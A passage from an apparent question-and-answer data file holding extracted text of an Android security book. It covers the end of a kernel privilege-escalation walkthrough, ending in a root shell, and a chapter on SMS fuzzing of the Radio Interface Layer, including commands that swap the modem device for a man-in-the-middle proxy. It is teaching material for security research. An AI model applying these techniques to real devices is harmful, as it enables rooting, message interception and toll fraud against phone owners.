(S_ISDIR(dp->mode)) {\n570 if (dp->proc_iops == NULL) {\n571 dp->proc_fops = &proc_dir_operations;\n572 dp->proc_iops = &proc_dir_inode_operations;\nThe proc_register function is used within the kernel to create entries in\nthe proc fi le system. When it creates directory entries it assigns a pointer to the\nproc_dir_inode_operations to the proc_iops member. Based on the type of the\ndp variable in this excerpt, you know the adjacent objects are proc_dir_entry\nstructures!\nNow that you know the outer data type’s structure, you can modify its ele-\nments accordingly. Copy the requisite data structures into your new exploit fi le\nand change undefi ned pointer types to void pointers. Modify the exploit to look\nfor the proc_dir_inode_operations symbol (instead of dev_attr_ro). Then\nimplement new trigger code that recursively scans through all directories in\n/proc. Finally, create a specially crafted inode_operations table with the getattr\nmember pointing at your kernel-space payload function. When something on\nthe system attempts to get the attributes of your modifi ed proc_dir_entry, the\nkernel calls your getattr function thereby giving you root privileges. As before,\nclean up and spawn a root shell for the user. Victory!\nSummary\nThis chapter covered several topics relevant to hacking and attacking the Linux\nkernel used by all Android devices. It explained how Android kernel exploi-\ntation is relatively easy because of its monolithic design, distribution model,\nconfi guration, and the vast exposed attack surface.\nAdditionally, this chapter provided tips and tools to make the job of an Android\nkernel exploit developer easier. You walked through the process of building\ncustom kernels and kernel modules, saw how to access the myriad debugging\nfacilities provided by the kernel, and how to extract information from both\ndevices and stock fi rmware images.\nc10.indd 11:11:6:AM 02/25/2014 Page 364\nChapter 10 ■ Hacking and Attacking the Kernel 365\nA few case studies examined the exploit development for kernel memory cor-\nruption issues such as array indexing vulnerabilities, direct memory mapping\nissues, information leaks, and heap memory corruption.\nThe next chapter discusses the telephony subsystem within Android. More\nspecifi cally, it explains how to research, monitor, and fuzz the Radio Interface\nLayer (RIL) component.\nc10.indd 11:11:6:AM 02/25/2014 Page 365"
  },
  {
    "input": "What is the role of the Radio Interface Layer (RIL) in an Android device and how can it be attacked, particularly through SMS fuzzing?",
    "summary": "The Radio Interface Layer (RIL) is a critical component of Android that handles cellular communication, including voice calls, text messaging, and mobile internet. It is present on most Android devices and is remotely attackable, allowing potential security threats like toll fraud and data interception. This chapter explains how to analyze and attack the RIL, focusing on SMS fuzzing to identify vulnerabilities. It details the RIL architecture, how SMS messages are processed, and provides a method to emulate a cellular modem for testing. The chapter also includes a Python script for generating SMS test cases and a tool for monitoring crashes, demonstrating how to find and verify security issues in the Android RIL.",
    "output": "CHAPTER\n11\nAttacking the Radio\nInterface Layer\nThe Radio Interface Layer, RIL in short, is the central component of the Android\nplatform that handles cellular communication. The Radio Interface Layer pro-\nvides an interface to the cellular modem and works with the mobile network\nto provide mobile services. The RIL is designed to operate independent of the\ncellular modem chips. Ultimately the RIL is responsible for things such as\nvoice calls, text messaging, and mobile Internet. Without the RIL, an Android\ndevice cannot communicate with a cellular network. The RIL is, in part, what\nmakes an Android device a smartphone. Today, cellular communication is no\nlonger limited to mobile phones and smartphones because tablets and eBook\nreaders come with built-in, always-on mobile Internet. Mobile Internet is the\nresponsibility of the RIL, and therefore, the RIL is present on most Android\ndevices.\nThis chapter shows you how the RIL works and how it can be analyzed and\nattacked. It methodically introduces you to the different components of RIL and\nhow they work together. The attack part of this chapter focuses on the Short\nMessaging Service (SMS) and specifi cally how to fuzz SMS on an Android\ndevice. The fi rst half of the chapter provides an overview of the Android RIL\nand introduces the SMS message format. The second half of the chapter takes\na deep dive into instrumenting the RIL to fuzz the SMS implementation of\nAndroid. When you reach the end of this chapter you will be armed with the\nknowledge to carry out your own security experiments on the Android RIL.\n367\nc11.indd 02:37:57:PM 02/24/2014 Page 367\n368 Chapter 11 ■ Attacking the Radio Interface Layer\nIntroduction to the RIL\nThe Android RIL is built to abstract the actual radio interface from the Android\ntelephony service subsystem. RIL is designed to handle all radio types such as\nthe Global System for Mobile communication (GSM), Code Division Multiple\nAccess (CDMA), 3G, and 4G Long Term Evolution (LTE). The RIL handles all\naspects of cellular communication such as network registration, voice calls, short\nmessages (SMS), and packet data (IP communication). Because of this, the RIL\nplays an important role on an Android device.\nThe Android RIL is one of the few pieces of software that is directly reach-\nable from the outside world. Its attack surface is comparable to that of a service\nhosted on a server. All data sent from the cellular network to an Android device\npasses through the RIL. This is best illustrated by examining how an incoming\nSMS message is processed.\nWhenever an SMS message is sent to an Android device, that message is\nreceived by the phone’s cellular modem. The cellular modem decodes the physi-\ncal transmission from the cell tower. After the message is decoded, it is sent on a\njourney starting at the Linux kernel; it passes through the various components\nof the Android RIL until it reaches the SMS application. The process of SMS\ndelivery inside the RIL is discussed in great detail throughout this chapter. The\nimportant message at this point is that the RIL provides a remotely attackable\npiece of software on an Android device.\nA successful attack against RIL provides a wide range of possibilities to\nattackers. Toll fraud is one such possibility. The RIL’s main function is to interact\nwith the digital baseband, and, therefore controlling RIL means access to the\nbaseband. With access to the baseband, an attacker can initiate premium rate\ncalls and send premium rate SMS messages. He can commit fraud and hurt\nthe victim fi nancially and, at the same time, he can gain monetarily. Spying\nis another possibility. RIL can control other features of the baseband, such as\nconfi guring the auto-answer setting. This could turn the phone into a room\nbug, which is quite a serious matter in an enterprise environment. Yet another\npossibility is intercepting data that passes through the RIL. Consequently, hav-\ning control of RIL means having access to data that is not protected (that is, not\nend-to-end encrypted).\nIn summary, a successful attack against RIL provides access to sensitive\ninformation and the possibility of monetizing the hijacked device at the owner’s\nexpense.\nRIL Architecture\nThis section provides a general overview of the RIL and the Android telephony\nstack. First, though, you get a brief overview of the common architecture of\nc11.indd 02:37:57:PM 02/24/2014 Page 368\nChapter 11 ■ Attacking the Radio Interface Layer 369\nmodern smartphones. The described architecture is found in all Android-based\nmobile devices.\nSmartphone Architecture\nTo help you better understand mobile telephony stacks, this section takes a quick\ndetour and looks at the design of a modern smartphone. Tablets that contain\na cellular interface are based on the same architecture. A modern smartphone\nconsists of two separate, but cooperating, systems. The fi rst system is called the\napplication processor. This subsystem consists of the main processor — most\nlikely a multi-core ARM-based central processing unit (CPU). This system also\ncontains the peripherals such as the display, touchscreen, storage, and audio input\nand output. The second system is the cellular baseband or cellular modem. The\nbaseband handles the physical radio link between the phone and the cellular\ncommunication infrastructure. Basebands are mostly composed from an ARM\nCPU and a digital signal processor (DSP). The type of application processor and\nbaseband is highly dependent on the actual device manufacturer and the kind\nof cellular network the device is built for (GSM versus CDMA, and so on). The\ntwo subsystems are connected to each other on the device’s main board. To\nreduce costs, chipset manufacturers sometimes integrate both into one single\nchip, but the systems still function independently. Figure 11-1 shows an abstract\nview of a modern smartphone.\nSoC\nGPS UART\nBaseband UART\nCPU\nCPU\nMemory\nDSP\nTouch-\nMemory Display Flash\nscreen\nFigure 11-1: General smartphone architecture\nThe interface between both systems is highly dependent on the actual com-\nponents and the device manufacturer. Commonly found interfaces are Serial\nc11.indd 02:37:57:PM 02/24/2014 Page 369\n370 Chapter 11 ■ Attacking the Radio Interface Layer\nPeripheral Interface (SPI), Universal Serial Bus (USB), Universal Asynchronous\nReceiver/Transmitter (UART), and shared memory. Because of this diversity,\nthe RIL is designed to be very fl exible.\nThe Android Telephony Stack\nThe telephony stack in Android is separated into four components which are\n(from top to bottom) the Phone and SMS applications, the application framework,\nthe RIL daemon, and the kernel-level device drivers. The Android platform is\npartially written in Java and partially written in C/C++ and thus respected parts\nare executed in either the Dalvik virtual machine (VM) or as native machine\ncode. This distinction is very interesting when it comes to fi nding bugs.\nIn the Android telephony stack, the separation between Dalvik and native\ncode is as follows. The application parts are written in Java and are thus executed\nin the Dalvik VM. The user-space parts such as the RIL daemon and libraries\nare native code. The Linux kernel, of course, is executed as native code. Figure\n11-2 depicts an overview of the Android Telephony Stack.\nPhone Application\nApplications\nCall Tracker SMS Dispatch Service Tracker Data Tracker\nPhone\n/java/android/telephony\nApplication\nFramework\nRIL\n/java/android/telephony/gsm\nDalvik\nNative\nRIL Daemon (rild)\n/system/bin/rild\nUser-Space\nVendor RIL\n/system/lib/lib-vendor.so\nVoice and\nControl IP Stack\nLinux Kernel\nPlatform and Baseband Drivers\nBaseband\nFigure 11-2: The Android telephony stack\nc11.indd 02:37:57:PM 02/24/2014 Page 370\nChapter 11 ■ Attacking the Radio Interface Layer 371\nThe Phone Applications\nThis component includes the high-level software that implements a number\nof core functionalities. It includes the Phone dialer and Messaging apps. Each\nbit of functionality is implemented in what Google calls a tracker. There is the\ncall tracker, the SMS dispatcher, the service tracker, and the data tracker. The call\ntracker handles voice calls — for example, establishing and tearing down the\ncall. The SMS dispatcher handles SMS and Multimedia Messaging Service (MMS)\nmessages. The service tracker handles cellular connectivity (for example, is the\ndevice connected to a network, what’s the reception level, is it roaming). The\ndata tracker is responsible for data connectivity (mobile Internet). The Phone\napplications communicate with the next layer — the Application Framework.\nThe Application Framework\nThe Application Framework components of the RIL serve two purposes. First,\nit provides an interface for the Phone application to communicate with the RIL\ndaemon. Second, it provides abstractions for many cellular-related concepts\nthat differ between network types. Developers can take advantage of these\nabstractions by using the methods in the android.telephony package in their\napplications.\nNative User-Space Components\nThe user-space components consist of the RIL daemon and its supporting librar-\nies. The RIL daemon is the main topic of this chapter and is discussed in more\ndetail in the “The RIL Daemon” and “The Vendor RIL API” sections later in\nthis chapter.\nThe Kernel\nThe Linux kernel hosts the lowest layer of the telephony stack. It contains the\ndrivers for the baseband hardware. The drivers mostly provide an interface for\nuser-land applications to talk to the baseband. This is often a serial line. This\ninterface is covered in more detail later in this chapter.\nTelephony Stack Customization\nThe Android telephony stack can be customized at various layers. In fact, some\ncustomizations are required. For example, the baseband driver has to be adapted\nto fi t the specifi c hardware confi guration. In addition to required changes, device\nmanufacturers also customize parts of the telephony stack that normally do not\nneed to be customized. Common customizations include a replacement phone\nc11.indd 02:37:57:PM 02/24/2014 Page 371\n372 Chapter 11 ■ Attacking the Radio Interface Layer\ndialer and a replacement or additional SMS and MMS application. Various manu-\nfacturers also seem to add functionality to the telephony-related Application\nFramework core quite frequently. Such customizations and additions are espe-\ncially interesting in terms of security because they are mostly closed source and\nmay not have been audited by qualifi ed security researchers.\nThe RIL Daemon (rild)\nThe most important part of the Radio Interface Layer is the RIL daemon (rild).\nThe RIL daemon is a core system service, and runs as a native Linux process. Its\nmain functionality is to provide connectivity between the Android Telephony\nApplication Framework and the device-specifi c hardware. To accomplish this, it\nexposes an interface to the Application Framework through Binder IPC. You can\nfi nd the source code for the open source portion of rild in the Android Open\nSource Project (AOSP) repository under the hardware/ril directory.\nGoogle specifi cally designed rild to support third-party, closed-source hard-\nware interface code. For this purpose, rild provides an application programming\ninterface (API) consisting of a set of function calls and callbacks. On startup,\nrild loads a vendor provided shared library called the vendor-ril. The vendor-ril\nimplements the hardware-specifi c functionality.\nThis daemon is one of the few services on an Android device that is managed\nby init. As such, rild is started on system startup and is restarted if the process\nterminates unexpectedly. Unlike some other system services, an RIL daemon\ncrash is unlikely to cause a partial reboot or leave the system in an unstable\nstate. These facts make playing around with rild very convenient.\nrild on Your Device\nThe RIL daemon is a little different on every device. As you get started with\nworking on your own device, it helps to have an overview of its confi guration.\nFollowing is a guide on how to get a quick overview of your rild environment.\nThe example uses an HTC One V running Android 4.0.3 and HTC Sense 4.0.\nBelow we issue a number of commands on an ADB shell to get an overview\nof the RIL environment. First, we obtain the process ID (PID) of rild. With the\nPID we can inspect the process using the proc fi le system. This provides us\nwith the list of libraries that are loaded by rild. In next step, we inspect the\ninit scripts. This provides us a list of UNIX domain sockets that are used by\nrild. In the third step, we again use the proc fi le system to determine which\nfi les are opened by rild. This provides us with the names of the serial devices\nthat are used by rild. In the last step, we dump all of the RIL related Android\nsystem properties using the getprop utility.\nshell@android:/ # ps |grep rild\nradio 1445 1 14364 932 ffffffff 40063fb4 S /system/bin/rild\nc11.indd 02:37:57:PM 02/24/2014 Page 372\nChapter 11 ■ Attacking the Radio Interface Layer 373\nshell@android:/ # cat /proc/1445/maps |grep ril\n00008000-0000a000 r-xp 00000000 b3:19 284 /system/bin/rild\n0000a000-0000b000 rw-p 00002000 b3:19 284 /system/bin/rild\n400a9000-400b9000 r-xp 00000000 b3:19 1056 /system/lib/libril.so\n400b9000-400bb000 rw-p 00010000 b3:19 1056 /system/lib/libril.so\n4015e000-401ed000 r-xp 00000000 b3:19 998 /system/lib/libhtc_ril.so\n401ed000-401f3000 rw-p 0008f000 b3:19 998 /system/lib/libhtc_ril.so\nshell@android:/ # grep rild /init.rc\nservice ril-daemon /system/bin/rild\nsocket rild stream 660 root radio\nsocket rild-debug stream 660 radio system\nsocket rild-htc stream 660 radio system\nshell@android:/data # ls -la /proc/1445/fd |grep dev\nlrwx------ root root 2013-01-15 12:55 13 -> /dev/smd0\nlrwx------ root root 2013-01-15 12:55 14 -> /dev/qmi0\nlrwx------ root root 2013-01-15 12:55 15 -> /dev/qmi1\nlrwx------ root root 2013-01-15 12:55 16 -> /dev/qmi2\nshell@android:/ $ getprop |grep ril\n[gsm.version.ril-impl]: [HTC-RIL 4.0.0024HM (Mar 6 2012,10:40:00)]\n[init.svc.ril-daemon]: [running]\n[ril.booted]: [1]\n[ril.ecclist]: [112,911]\n[ril.gsm.only.version]: [2]\n[ril.modem_link.status]: [0]\n[ril.reload.count]: [1]\n[ril.sim.swap.status]: [0]\n[rild.libpath.ganlite]: [/system/lib/librilswitch.so]\n[rild.libpath]: [/system/lib/libhtc_ril.so]\n[rilswitch.ganlibpath]: [/system/lib/libganril.so]\n[rilswitch.vendorlibpath]: [/system/lib/libhtc_ril.so]\n[ro.ril.def.agps.mode]: [2]\n[ro.ril.enable.a52.HTC-ITA]: [1]\n[ro.ril.enable.a52]: [0]\n[ro.ril.enable.a53.HTC-ITA]: [1]\n[ro.ril.enable.a53]: [1]\n[ro.ril.enable.amr.wideband]: [1]\n[ro.ril.enable.dtm]: [1]\n[ro.ril.enable.managed.roaming]: [1]\n[ro.ril.gprsclass]: [12]\n[ro.ril.hsdpa.category]: [10]\n[ro.ril.hsupa.category]: [6]\n[ro.ril.hsxpa]: [2]\n...\nThere are a number of interesting pieces of information in the preceding code,\nsuch as the name of the vendor-ril, which is libhtc_ril.so. Further, rild further\nc11.indd 02:37:57:PM 02/24/2014 Page 373\n374 Chapter 11 ■ Attacking the Radio Interface Layer\nexposes a number of sockets in /dev/socket. These sockets serve various pur-\nposes. For example, the /dev/socket/rild-debug and /dev/socket/rild-htc\nsockets facilitate debugging rild and/or the vendor-ril. The name of the serial\ndevice used to talk to the cellular baseband is the most interesting detail. For the\nHTC One V, this device is /dev/smd0. The serial device is especially interesting\nfor security since rild sends commands to the modem via this serial device.\nCommands include incoming and outgoing SMS messages, therefore making\nthis communication link very interesting for attacks.\nSecurity\nThe RIL daemon is one of the few pieces of software on an Android device that\nis directly reachable from the outside world. Both rild and the vendor-ril are\nimplemented in C and C++ and are compiled to native code. These programming\nlanguages are not memory safe and therefore tend to be a signifi cant source of\nsecurity issues. The RIL daemon has to deal with a lot of inputs that it receives\nfrom various sources. The code in rild has to parse and process data and\ncontrol information it receives from the cellular modem and from the Android\nFramework. The straightforward example is an SMS message.\nProcessing an incoming SMS message traverses several different pieces of\nhardware and software, each of which an attacker can target. Whenever an SMS\nmessage is sent to an Android device, that message is received by the baseband.\nThe baseband decodes the physical transmission and forwards the message via\nthe baseband driver in the Linux kernel. The driver in the Linux kernel forwards\nit to the vendor-ril library in the RIL daemon. The RIL daemon pushes the mes-\nsage up into the Android Telephony Framework. Therefore, the RIL is a remotely\nattackable piece of software on every Android device. Attackers prefer remote\nattacks since they do not require any interaction on the part of the target user.\nWhen the RIL daemon starts, it is typically executed with root privileges. To\nminimize the risk, rild drops its privileges to the radio user shortly thereafter.\nThe radio user only has access to the relevant resources required to fulfi ll its\nduties. Nevertheless, rild still has access to interesting data (such as SMS mes-\nsages) and interesting functionality (ability to send SMS messages and make\nphone calls) as stated earlier in this chapter. Further, the radio user and group\nare used to ensure the resources on the system that are only required by rild\nare not overly exposed.\nThe Vendor-ril API\nThe vendor-ril is the manufacturer and device-specifi c code that implements the\nfunctionality to interact with a specifi c type of cellular baseband. Because base-\nbands are still highly proprietary, the RIL subsystem was specifi cally designed\nc11.indd 02:37:57:PM 02/24/2014 Page 374\nChapter 11 ■ Attacking the Radio Interface Layer 375\nwith binary-only extensions in mind. In fact, device vendors are often legally\nbound by non-disclosure agreements that prevent them from releasing source code.\nFrom a security standpoint, looking at vendor-rils is very interesting. Because\nthey are almost exclusively binary only, it is likely that they haven’t been audited\nby the general Android community. Further, the vendor-ril is one of the parts\nof an Android system that needs to be customized often. In addition, because\nstability is a big issue, the vendor-ril library might contain hidden, possibly\nunhardened debugging functionality. In sum, these facts indicate that bugs and\nvulnerabilities are more likely to exist in the code of the vendor-ril.\nRIL-to-Baseband Communication\nThe vendor-ril implements the functionality that enables rild to interact with the\nbaseband. The implementation is completely vendor and baseband dependent.\nIt can either be a proprietary protocol or the standardized text-based GSM AT\ncommand set. If the GSM AT command set is used by a given baseband, the\naccompanying Linux kernel driver most likely provides a serial device in the\n/dev fi lesystem. In this case, the RIL daemon just opens the given device and\nspeaks the GSM AT protocol. Although the protocol is standardized, baseband\nmanufacturers will likely add custom commands to their basebands. For this\nreason, a matching vendor-ril is always needed. Furthermore, most basebands\nbehave differently, even on standardized commands. In all other cases, the\nprotocol is entirely up to the manufacturer.\nNOTE You can fi nd more information about the GSM AT command set at http://\nwww.etsi.org/deliver/etsi_i_ets/300600_300699/300642/04_60/\nets_300642e04p.pdf.\nFor the sake of simplicity, this chapter only covers modem communications\nbased on AT commands. That said, some of the proprietary baseband protocols\nhave been reverse engineered and re-implemented in open-source software.\nOne example is the protocol that Samsung uses on all their devices. You can\nfi nd information about this protocol in the Replicant project at http://redmine\n.replicant.us/projects/replicant/wiki/SamsungModems.\nShort Message Service (SMS)\nSMS is a basic service of cellular networks. Most people only know SMS as a\nway to send a text message from one phone to another phone, but SMS is much\nmore then text messaging. It is used for all kinds of communication between\ncellular network infrastructure and mobile handsets.\nc11.indd 02:37:57:PM 02/24/2014 Page 375\n376 Chapter 11 ■ Attacking the Radio Interface Layer\nSMS was standardized 20 years ago by the Global System for Mobile\nCommunication Association (GSMA). SMS was not part of the original network\ndesign; it was added to the standard a little later. SMS uses the control channel\nthat is normally used to signal incoming and outgoing calls between the cell\ntower and the mobile handset. The use of the control channel for SMS is also the\nreasons why SMS messages are limited to 140 bytes or 160 7-bit characters. Today,\nthe SMS service is available on almost every kind of cellular phone network.\nSending and Receiving SMS Messages\nWhen an SMS message is sent from one phone to another, the message is not\ndirectly transmitted between the two devices. The sending phone sends the\nSMS message to a service on the cellular network called the Short Message\nService Center (SMSC). After the SMSC receives the message, it then delivers\nthe SMS message to the destination phone. This operation may involve multiple\nintermediary SMSC endpoints.\nThe SMSC does much more than just forward SMS messages between the\nsender and receiver. If the receiving phone is not in range of a cell tower, or if\nthe phone is switched off, the SMSC queues the message until the phone comes\nback online. SMS delivery is “best effort,” meaning there is no guarantee that an\nSMS message will be delivered at all. The SMS standard supports a time-to-live\nvalue to specify how long a message should be queued before it can be discarded.\nThe process of how SMS messages are received and handled on the mobile\nhandset side is discussed in detail in the “Interacting with the Modem” section\nlater in this chapter.\nSMS Message Format\nAs previously mentioned SMS is much more than sending text messages between\nphones. SMS is used for changing and updating phone confi guration, sending\nringtones and Multimedia Messaging Service (MMS) messages, and notify-\ning the user about waiting voicemails. To implement all these features, SMS\nsupports sending binary data in addition to plain text messages. Due to its\nmany features SMS is interesting for mobile phone security. This section briefl y\nintroduces the most important parts of the SMS message format. You can fi nd\nmore details in the 3GPP SMS standard at http://www.3gpp.org/ftp/Specs/\nhtml-info/23040.htm.\nThe SMS Format\nSMS messages come in two different formats, depending on whether the SMS\nmessage is sent from phone to SMSC or from SMSC to phone. The two formats\ndiffer only slightly. Because we are only interested in the delivery side (the mobile\nc11.indd 02:37:57:PM 02/24/2014 Page 376\nChapter 11 ■ Attacking the Radio Interface Layer 377\nphone side), this section only covers the delivery format named SMS-Deliver.\nThe SMS-Deliver format is depicted in Figure 11-3.\nField Octets Purpose\nSMSC variable SMSC Number\nDeliver 1 Message Flags\nSender variable Sender Number\nTP-PID 1 Protocol ID\nTP-DCS 1 Data Coding Scheme\nTP-SCTS 7 Time Stamp\nUDL 1 User Data Length\nUD variable User Data\nFigure 11-3: SMS PDU Format\nThe following code excerpt shows an example of an SMS message in the SMS-\nDeliver PDU (protocol data unit) format. It appears just as it would be delivered\nfrom the cellular modem to the telephony stack.\n0891945111325476F8040D91947187674523F100003150821142154\n00DC8309BFD060DD16139BB3C07\nThe message starts with the SMSC information. The SMSC information con-\nsists of a one octet length fi eld, one octet phone number type fi eld (91 indicating\nthe international format), and a variable number of octets (based on the length\nfi eld) for the SMSC number. The actual SMSC number is encoded with the\nhigh and low nibbles (4 bits) swapped in the protocol data unit (PDU). Further,\nnotice that if the number does not terminate on an octet boundary then the\nremaining nibble is fi lled with an F. Both properties are easily recognizable\nby comparing the start of the PDU message previously shown to the following\ndecoded SMSC number.\nLength Type Number\n08 91 4915112345678\nThe next fi eld is the Deliver fi eld, which specifi es the message header fl ags.\nThis fi eld is one octet long and indicates, for example, if there are more messages\nto be sent (like in our case 0 × 04) or if a User Data Header (UDH) is present in\nthe User Data (UD) section. The latter is conveyed using the User Data Header\nIndication (UDHI) bit. The UDH will be briefl y discussed later in this section.\nThe following fi eld is the sender number. Besides the length fi eld, it has the\nsame format as the SMSC number. The sender number length fi eld is calculated\nusing the number of digits that appear in the phone number and not the actual\nnumber of octets that are stored in the PDU.\nLength Type Number\n0D 91 4917787654321\nc11.indd 02:37:57:PM 02/24/2014 Page 377\n378 Chapter 11 ■ Attacking the Radio Interface Layer\nThe Protocol Identifi er (TP-PID) fi eld follows the sender number. The TP-PID\nfi eld has various meanings based on which bits are set in the fi eld. Normally,\nit is set to 0 × 00 (zero). The fi eld after TP-PID is the Data Coding Scheme\n(TP-DCS). This fi eld defi nes how the User Data (UD) section of the SMS mes-\nsage is encoded. Possible encodings include 7-bit, 8-bit, and 16-bit alphabets.\nThis fi eld is also used to indicate if compression is used. Common values are 0\n× 00 for 7-bit uncompressed messages and 0 × 04 for 8-bit uncompressed data.\nThe example message uses 0 × 00 to indicate 7-bit text.\nThe next fi eld is the Time Stamp of the SMS message (TP-SCTS). The time\nstamp uses 7-octets. The fi rst octet is the year. The second octet is the month.\nAnd so on. Each octet is nibble swapped. The time stamp of the example mes-\nsage indicates that the message was sent on May 28th, 2013.\nThe User Data Length (UDL) is dependent on the data coding scheme (TP-DCS)\nand indicates how many septets (7-bit elements) of data are stored in the user data\nsection. Our message carries 13 (0 × 0D) septets of data in the user data section.\nThe user data of the example message is C8309BFD060DD16139BB3C07. When\ndecoded, it reads Hello Charles.\nSMS User Data Header (UDH)\nThe User Data Header (UDH) is used to implement SMS features that go beyond\nsimple text messages. For example, the UDH is used to implement features such\nas multi-part messages, port addressed messages, indications (such as, waiting\nvoicemail — the small mail symbol in the Android notifi cation bar), Wireless\nApplication Protocol (WAP) push, and MMS (based on WAP push). The UDH\nis part of the User Data fi eld in the SMS-Deliver format. The presence of a UDH\nis indicated through the UDHI fl ag in the Deliver fi eld of the SMS message.\nThe UDH is a general purpose data fi eld and consists of a length fi eld (UDHL)\nand a data fi eld. The length fi eld indicates how many octets are present in the\ndata fi eld. The actual data fi eld is formatted using a typical type-length-value\n(TLV) format called an Information Element (IE). The IE is structured as shown\nin Figure 11-4.\nField Octets\nInformation Element Identifier (IEI) 1\nInformation Element Data Length (IEDL) 1\nInformation Element Data (IED) variable\nFigure 11-4: The IE Format\nThe fi rst octet indicates the type. This is called the Information Element\nIdentifi er (IEI). The second octet stores the length. This is called the Information\nc11.indd 02:37:57:PM 02/24/2014 Page 378\nChapter 11 ■ Attacking the Radio Interface Layer 379\nElement Data Length (IEDL). The following octets are the actual data, called the\nInformation Element Data (IED). The UDH can contain an arbitrary number of\nIEs. The following is an example of a UDH that contains one IE. The IE indicates\na multipart SMS message.\n050003420301\nThe UDH length is 0 × 05. The IEI for a multipart message header is 0 × 00.\nThe length is 0 × 03. The rest is the data section of the IE. The format of the\nmultipart message IE is the message ID (0 × 42 in this case), the number of parts\nthat belong to this message (0 × 03), and the current part (0 × 01).\nFor more details and a list of all standardized IEIs, please refer to the SMS\nstandard at http://www.3gpp.org/ftp/Specs/html-info/23040.htm.\nInteracting with the Modem\nThis section explains the steps necessary to interact with the modem of an\nAndroid smartphone. There are several reasons to interact with the modem.\nThe primary reason covered in this chapter is for fuzzing the telephony stack.\nEmulating the Modem for Fuzzing\nOne method to fi nd bugs and vulnerabilities in the components that make up\nthe Radio Interface Layer is fuzzing. Fuzzing, also discussed in Chapter 6, is a\nmethod for testing software input validation by feeding it intentionally mal-\nformed input. Fuzzing has a long history and has been proven to work. In order\nto do successful fuzzing, three tasks have to be accomplished: input generation,\ntest-case delivery, and crash monitoring.\nVulnerabilities in SMS handling code provide a truly remote attack vector. SMS\nis an open standard and is well documented. Therefore, it is easy to implement\na program that generates SMS messages based on the standard. These proper-\nties make SMS a perfect target for fuzzing. Later in the chapter a rudimentary\nSMS fuzz generator is demonstrated.\nNext, the malicious input has to be delivered to the software component that\nis going to be fuzz-tested. In the example, this component is rild. Normally,\nSMS messages are delivered over the air. The sender’s phone sends the mes-\nsage to the cellular network and the cellular network delivers the message to\nthe receiving phone. However, sending SMS messages using this method has\nmany problems.\nFirst of all, message delivery is slow and takes a couple of seconds. Depending\non the operator and country, certain SMS message types cannot be sent. Further,\ncertain message types will be accepted by the cellular operator, but will not be\ndelivered to the receiver. Without access to the mobile operator’s systems, it is\nc11.indd 02:37:57:PM 02/24/2014 Page 379\n380 Chapter 11 ■ Attacking the Radio Interface Layer\nimpossible to determine why a certain message did not get delivered to the\nreceiver. Further, sending SMS messages costs money (although many cellular\ncontracts offer unlimited SMS messaging). In addition, the mobile operator\nmight disable the account of the message sender or receiver after sending a\ncouple thousand messages a day. Further, in theory operators have the pos-\nsibility to log all SMS messages that pass through their network. They might\ncapture the SMS message that triggered a bug and thus the operator has the\npotential to take your fuzzing result away from you. Malformed messages may\nunintentionally do harm to back-end cellular infrastructure, such as an SMSC\nendpoint. These issues make it unreliable to send SMS messages for fuzzing\npurposes via the cellular network.\nRemoving all the mentioned obstacles is a desirable goal. The goal can be\nachieved in multiple ways, such as using a small GSM base station to run your\nown cellular network. However, there are better options, such as emulating the\ncellular modem.\nOur goal is emulating specifi c parts of the cellular modem to enable injecting\nSMS messages into the Android telephony stack. Of course you could try to\nimplement a complete modem emulator in software, but this is a lot of unnec-\nessary work. You only need to emulate a few specifi c parts of the modem. The\nsolution for this is to interpose between the modem and rild. If you can put a\npiece of software between the modem and rild, you can act as a man-in-the-\nmiddle and observe and modify all data sent between the two components.\nInterposing at this level provides access to all command/response pairs exchanged\nbetween rild and the modem. Also, you can block or modify commands and/\nor responses. Most importantly, you can inject your own responses and pretend\nthey originate from the modem. The RIL daemon and the rest of the Android\ntelephony stack cannot distinguish between real and injected commands,\nand therefore they process and handle every command/response as if it were\nissued by the actual modem. Interposing provides a powerful method for explor-\ning the telephony security at the boundary between the cellular modem and\nthe Android telephony stack.\nInterposing on a GSM AT Command-Based Vendor-ril\nCellular basebands that implement the GSM AT command set are common.\nBecause the AT command set is text based, it is relatively easy to understand\nand implement it. It provides the perfect playground for our endeavor into RIL\nsecurity. In 2009, Collin Mulliner and Charlie Miller published this approach\nin “Injecting SMS Messages into Smart Phones for Vulnerability Analysis” (3rd\nUSENIX Workshop on Offensive Technologies (WOOT), Montreal, Canada, 2009)\nin an effort to analyze Apple’s iOS, Microsoft’s Windows Mobile, and Google’s\nAndroid. Mulliner and Miller’s paper is available at http://www.usenix.org/\nc11.indd 02:37:57:PM 02/24/2014 Page 380\nChapter 11 ■ Attacking the Radio Interface Layer 381\nevents/woot09/tech/full_papers/mulliner.pdf. They created a tool called\nInjectord that performs interposition (a man-in-the-middle attack) against rild.\nThe source code for Injectord is freely available at http://www.mulliner.org/\nsecurity/sms/ and with the materials accompanying this book.\nThe demo device, the HTC One V, has one serial device that is used by rild,\n/dev/smd0. Injectord basically functions as a proxy. It opens the original serial\ndevice and provides a new serial device to rild. Injectord reads commands\nissued by rild from the fake serial device and forwards them to the original\nserial device that is connected to the modem. The answers read from the original\ndevice are then forwarded to rild by writing them to the fake device.\nTo trick rild into using the fake serial device, the original device /dev/smd0\nis renamed to /dev/smd0real. Injectord creates the fake device with the name\n/dev/smd0, thus causing rild to use the fake serial device. On Linux, the fi le-\nname of a device fi le is not important because the kernel only cares about the\ndevice type and the major and minor numbers. The specifi c steps are listed in\nthe following code.\nmv /dev/smd0 /dev/smd0real\n/data/local/tmp/injectord\nKill -9 <PID of rild>\nWhen Injectord is running, it logs all communication between the cellular\nbaseband and rild. An example log of an SMS being sent from the phone to\nthe baseband is shown here:\nread 11 bytes from rild\nAT+CMGS=22\nread 3 bytes from smd0\n>\nread 47 bytes from rild\n0001000e8100947167209508000009c2f77b0da297e774\nread 2 bytes from smd0\nread 14 bytes from smd0\n+CMGS: 128\n0\nThe fi rst command tells the modem the length of the SMS PDU; in the example\nit is 22 bytes. The modem answers with > to indicate that it is ready to accept\nthe SMS message. The next line, issued by rild, contains the SMS PDU in hex\nencoding (44 characters). In the last step, the modem acknowledges the SMS\nmessage. Inspecting the log of Injectord is a great way to learn about AT com-\nmands, including specifi c non-standard vendor-ril modem communications.\nc11.indd 02:37:57:PM 02/24/2014 Page 381\n382 Chapter 11 ■ Attacking the Radio Interface Layer\nPhone Side SMS Delivery\nThe main goal is to emulate SMS delivery from the network to the Android\ntelephony stack. Of specifi c interest is how SMS messages are delivered from\nthe modem to rild. The GSM AT command set defi nes two types of interac-\ntion between the baseband and the telephony stack: command-response and\nunsolicited response. The telephony stack issues a command to the baseband,\nwhich is answered by the baseband immediately. For events that come from the\nnetwork, the baseband simply issues an 